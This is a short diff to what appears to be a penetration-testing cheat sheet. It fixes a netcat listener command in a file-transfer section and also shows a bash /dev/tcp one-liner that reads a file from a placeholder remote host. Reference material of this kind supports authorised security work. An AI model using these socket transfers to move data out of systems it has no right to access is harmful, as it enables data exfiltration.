@@ -685,7 +685,7 @@ $ file <file>
 
 ```c
 $ bash -c "cat < /dev/tcp/<RHOST>/<RPORT> > <FILE>"
-$ nc -lnvp <LPORT> < <FILE>
+$ nc -lnvp <LPORT> > <FILE>
 ```
 
 #### From the Target
